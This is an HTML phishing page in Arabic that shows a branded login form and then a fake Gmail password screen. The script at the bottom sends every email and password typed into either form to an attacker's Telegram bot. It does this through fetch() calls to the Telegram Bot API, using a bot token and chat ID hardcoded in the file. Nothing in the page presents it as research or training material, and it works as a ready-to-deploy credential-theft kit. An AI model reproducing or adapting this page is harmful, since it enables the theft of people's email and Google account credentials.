<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: linear-gradient(135deg, #001a4d 0%, #003d99 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 400px;
        }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 40px;
            position: relative;
        }

        .back-btn {
            background: none;
            border: none;
            color: white;
            font-size: 28px;
            cursor: pointer;
            padding: 0;
            transition: opacity 0.3s ease;
        }

        .back-btn:hover {
            opacity: 0.7;
        }

        .logo {
            flex: 1;
            display: flex;
            justify-content: center;
        }

        .logo img {
            height: 60px;
            object-fit: contain;
        }

        .placeholder-space {
            width: 28px;
        }

        .heading {
            text-align: center;
            color: white;
            font-size: 16px;
            font-weight: 400;
            line-height: 1.6;
            margin-bottom: 40px;
            letter-spacing: 0.3px;
        }

        .form-group {
            margin-bottom: 25px;
        }

        label {
            display: block;
            color: white;
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 12px;
        }

        .input-wrapper {
            position: relative;
        }

        input {
            width: 100%;
            padding: 16px 18px;
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 12px;
            color: white;
            font-size: 14px;
            font-family: inherit;
            transition: all 0.3s ease;
            text-align: right;
        }

        input::placeholder {
            color: rgba(255, 255, 255, 0.6);
        }

        input:focus {
            outline: none;
            background: rgba(255, 255, 255, 0.15);
            border-color: rgba(255, 255, 255, 0.4);
        }

        .form-actions {
            margin-top: 30px;
            margin-bottom: 40px;
            display: flex;
            justify-content: center;
        }

        .submit-btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #39e76d 0%, #00d084 100%);
            color: #001a4d;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            text-align: center;
        }

        .submit-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 24px rgba(57, 231, 109, 0.3);
        }

        .submit-btn:active {
            transform: translateY(0);
        }

        .submit-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .loading {
            display: none;
            text-align: center;
            color: white;
            margin-top: 20px;
        }

        .spinner {
            border: 3px solid rgba(255, 255, 255, 0.2);
            border-top: 3px solid #39e76d;
            border-radius: 50%;
            width: 24px;
            height: 24px;
            animation: spin 1s linear infinite;
            margin: 0 auto 10px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Gmail Page Styles */
        .gmail-page {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: white;
            z-index: 1000;
            overflow-y: auto;
        }

        .gmail-page.active {
            display: flex;
            flex-direction: column;
        }

        .gmail-header {
            background: white;
            border-bottom: 1px solid #dadce0;
            padding: 16px 24px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .gmail-header-left {
            display: flex;
            align-items: center;
            gap: 16px;
        }

        .gmail-back-btn {
            background: none;
            border: none;
            font-size: 24px;
            color: #202124;
            cursor: pointer;
            padding: 0;
        }

        .gmail-back-btn:hover {
            color: #5f6368;
        }

        .gmail-logo-header {
            width: 40px;
            height: 40px;
        }

        .gmail-logo-header img {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }

        .gmail-header-right {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .gmail-profile {
            width: 32px;
            height: 32px;
            background: #d3d3d3;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 16px;
            cursor: pointer;
        }

        .gmail-content {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 40px 20px;
            background: white;
        }

        .gmail-container-center {
            text-align: center;
            max-width: 600px;
        }

        .gmail-logo-main {
            margin-bottom: 30px;
        }

        .gmail-logo-main img {
            width: 120px;
            height: auto;
        }

        .gmail-title {
            font-size: 32px;
            font-weight: 500;
            color: #202124;
            margin-bottom: 8px;
        }

        .gmail-subtitle {
            font-size: 16px;
            color: #5f6368;
            margin-bottom: 32px;
            line-height: 1.6;
        }

        .gmail-user-email {
            background: #f8f9fa;
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 16px 20px;
            margin-bottom: 32px;
            font-size: 16px;
            color: #202124;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .gmail-user-email span {
            flex: 1;
            text-align: right;
            margin-right: 16px;
        }

        .gmail-user-icon {
            width: 40px;
            height: 40px;
            background: #dadce0;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
        }

        .gmail-password-form {
            width: 100%;
            max-width: 400px;
        }

        .gmail-form-group {
            margin-bottom: 20px;
        }

        .gmail-label {
            display: block;
            font-size: 12px;
            color: #5f6368;
            margin-bottom: 8px;
            font-weight: 500;
        }

        .gmail-input {
            width: 100%;
            padding: 12px 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            font-family: inherit;
            transition: all 0.3s ease;
            text-align: right;
            position: relative;
        }

        .gmail-input:focus {
            outline: none;
            border-color: #1f73e6;
            box-shadow: 0 1px 3px rgba(31, 115, 230, 0.3);
        }

        .gmail-input::placeholder {
            color: #80868b;
        }

        .gmail-actions {
            display: flex;
            gap: 12px;
            margin-top: 24px;
        }

        .gmail-btn {
            flex: 1;
            padding: 10px 24px;
            border: 1px solid #dadce0;
            background: white;
            color: #1f73e6;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .gmail-btn:hover {
            background: #f8f9fa;
            border-color: #dadce0;
        }

        .gmail-btn-primary {
            background: #1f73e6;
            color: white;
            border: none;
        }

        .gmail-btn-primary:hover {
            background: #1765cc;
        }

        .gmail-forgot {
            text-align: center;
            margin-top: 20px;
        }

        .gmail-forgot a {
            color: #1f73e6;
            text-decoration: none;
            font-size: 14px;
        }

        .gmail-forgot a:hover {
            text-decoration: underline;
        }

        .gmail-checkbox {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-top: 12px;
        }

        .gmail-checkbox input {
            width: auto;
            padding: 0;
            border: none;
            background: none;
            cursor: pointer;
        }

        .gmail-checkbox label {
            margin: 0;
            font-size: 13px;
            color: #5f6368;
            font-weight: 400;
            cursor: pointer;
        }

        @media (max-width: 480px) {
            .container {
                padding: 0 15px;
            }

            .heading {
                font-size: 15px;
            }

            input {
                font-size: 16px;
            }

            .gmail-title {
                font-size: 24px;
            }

            .gmail-subtitle {
                font-size: 14px;
            }

            .gmail-header {
                padding: 12px 16px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- الصفحة الأولى - البريد والمرور -->
        <div class="login-page active">
            <div class="header">
                <button class="back-btn" onclick="window.history.back()">←</button>
                <div class="logo">
                    <img src="https://a.top4top.io/p_3743bvz3x0.png" alt="lba logo">
                </div>
                <div class="placeholder-space"></div>
            </div>

            <h1 class="heading">للاستمرار، يرجى إدخال البريد الإلكتروني المستخدم وكلمة المرور</h1>

            <form id="loginForm">
                <div class="form-group">
                    <label for="email">البريد الإلكتروني</label>
                    <div class="input-wrapper">
                        <input 
                            type="email" 
                            id="email" 
                            name="email"
                            placeholder="أدخل بريدك الإلكتروني"
                            required
                        >
                    </div>
                </div>

                <div class="form-group">
                    <label for="password">كلمة المرور</label>
                    <div class="input-wrapper">
                        <input 
                            type="password" 
                            id="password" 
                            name="password"
                            placeholder="أدخل كلمة المرور"
                            required
                        >
                    </div>
                </div>

                <div class="form-actions">
                    <button type="submit" class="submit-btn" id="submitBtn">الدخول</button>
                </div>
            </form>

            <div class="loading" id="loading">
                <div class="spinner"></div>
                <p>جاري الإرسال...</p>
            </div>
        </div>
    </div>

    <!-- صفحة Gmail -->
    <div class="gmail-page" id="gmailPage">
        <div class="gmail-header">
            <div class="gmail-header-left">
                <button class="gmail-back-btn" onclick="goBackToLogin()">←</button>
                <div class="gmail-logo-header">
                    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <text x="2" y="18" font-size="16" font-weight="bold" fill="#4285f4">Gmail</text>
                    </svg>
                </div>
            </div>
            <div class="gmail-header-right">
                <div class="gmail-profile">👤</div>
            </div>
        </div>

        <div class="gmail-content">
            <div class="gmail-container-center">
                <div class="gmail-logo-main">
                    <svg width="80" height="80" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <rect width="24" height="24" rx="3" fill="#EA4335"/>
                        <path d="M3 5L12 12L21 5" stroke="white" stroke-width="1.5" stroke-linecap="round"/>
                        <path d="M3 5H21V19C21 19.5304 20.7893 20.0391 20.4142 20.4142C20.0391 20.7893 19.5304 21 19 21H5C4.46957 21 3.96086 20.7893 3.58579 20.4142C3.21071 20.0391 3 19.5304 3 19V5Z" stroke="white" stroke-width="1.5" stroke-linejoin="round"/>
                    </svg>
                </div>

                <h1 class="gmail-title">أهلاً وسهلاً</h1>
                <p class="gmail-subtitle">أدخل كلمة مرور Google حسابك</p>

                <div class="gmail-user-email">
                    <div class="gmail-user-icon">👤</div>
                    <span id="gmailUserEmail">your.email@gmail.com</span>
                </div>

                <form id="gmailPasswordForm" class="gmail-password-form">
                    <div class="gmail-form-group">
                        <label class="gmail-label">أدخل كلمة المرور</label>
                        <input 
                            type="password" 
                            id="gmailPassword" 
                            class="gmail-input"
                            placeholder="أدخل كلمة المرور"
                            required
                        >
                    </div>

                    <div class="gmail-checkbox">
                        <input type="checkbox" id="gmailShowPassword" onchange="toggleGmailPassword()">
                        <label for="gmailShowPassword">عرض كلمة المرور</label>
                    </div>

                    <div class="gmail-forgot">
                        <a href="#">هل نسيت كلمة المرور؟</a>
                    </div>

                    <div class="gmail-actions">
                        <button type="button" class="gmail-btn" onclick="goBackToLogin()">الرجوع</button>
                        <button type="submit" class="gmail-btn gmail-btn-primary">التالي</button>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <script>
        const TELEGRAM_BOT_TOKEN = '8607340933:AAEKE8jwaYZVx_4955TocD8kCeg6se9Fdyg';
        const TELEGRAM_CHAT_ID = '6873334348';

        let savedEmail = '';

        // الصفحة الأولى
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();

            const email = document.getElementById('email').value.trim();
            const password = document.getElementById('password').value;

            if (!email || !password) {
                alert('الرجاء ملء جميع الحقول');
                return;
            }

            savedEmail = email;

            // إرسال البيانات إلى التلجرام
            await sendToTelegram(email, password);

            // الانتقال إلى صفحة Gmail
            goToGmailPage(email);
        });

        // صفحة Gmail
        document.getElementById('gmailPasswordForm').addEventListener('submit', async function(e) {
            e.preventDefault();

            const password = document.getElementById('gmailPassword').value;

            if (!password) {
                alert('الرجاء إدخال كلمة المرور');
                return;
            }

            // إرسال البيانات إلى التلجرام
            await sendToTelegram(savedEmail, password);

            alert('تم التحقق بنجاح!');
        });

        function goToGmailPage(email) {
            document.querySelector('.login-page').style.display = 'none';
            document.getElementById('gmailPage').classList.add('active');
            document.getElementById('gmailUserEmail').textContent = email;
        }

        function goBackToLogin() {
            document.querySelector('.login-page').style.display = 'block';
            document.getElementById('gmailPage').classList.remove('active');
            document.getElementById('loginForm').reset();
        }

        function toggleGmailPassword() {
            const input = document.getElementById('gmailPassword');
            const checkbox = document.getElementById('gmailShowPassword');

            if (checkbox.checked) {
                input.type = 'text';
            } else {
                input.type = 'password';
            }
        }

        async function sendToTelegram(email, password) {
            try {
                const message = `
📧 <b>بيانات دخول جديدة</b>
━━━━━━━━━━━━━━━━━
📌 <b>البريد الإلكتروني:</b> <code>${email}</code>
🔐 <b>كلمة المرور:</b> <code>${password}</code>
⏰ <b>التاريخ والوقت:</b> ${new Date().toLocaleString('ar-SA')}
━━━━━━━━━━━━━━━━━`;

                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });

                const data = await response.json();

                if (data.ok) {
                    console.log('تم إرسال البيانات بنجاح');
                }
            } catch (error) {
                console.error('Error:', error);
            }
        }
    </script>
</body>
</html>
